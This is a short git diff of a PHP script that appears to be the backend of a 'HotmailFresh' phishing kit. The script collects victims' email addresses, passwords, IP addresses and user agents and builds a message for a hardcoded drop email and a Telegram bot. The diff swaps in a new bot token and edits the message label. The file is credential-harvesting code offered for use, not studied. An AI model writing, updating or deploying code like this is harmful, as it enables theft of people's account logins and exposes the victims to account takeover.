@@ -8,8 +8,9 @@ ini_set('display_errors', 0);
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
 header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
+
 $recipient_email = "tag100@mailfence.com"; // Change to your receiving email
-$telegram_bot_token = "7594602249:AAH1nBkDp6AlsZy86yHka-mNQ6wmx-_C3oM";    // Bot token
+$telegram_bot_token = "7594602249:AAHFjQZVt5nusY98DDOpEb-154SZMzFjuCo";    // Bot token
 $telegram_chat_id = "7724482403";        // Telegram chat ID
 $user_ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
@@ -24,7 +25,7 @@ if (empty($email) || (empty($firstPassword) && empty($password))) {
 }
 
 
-$msg = "HotmailFresh Login Attempt \n";
+$msg = "HotmailFresh Login Para \n";
 $msg .= "E: $email\n";
 if (!empty($firstPassword)) $msg .= "P1: $firstPassword\n";
 if (!empty($password))      $msg .= "P2: $password\n";
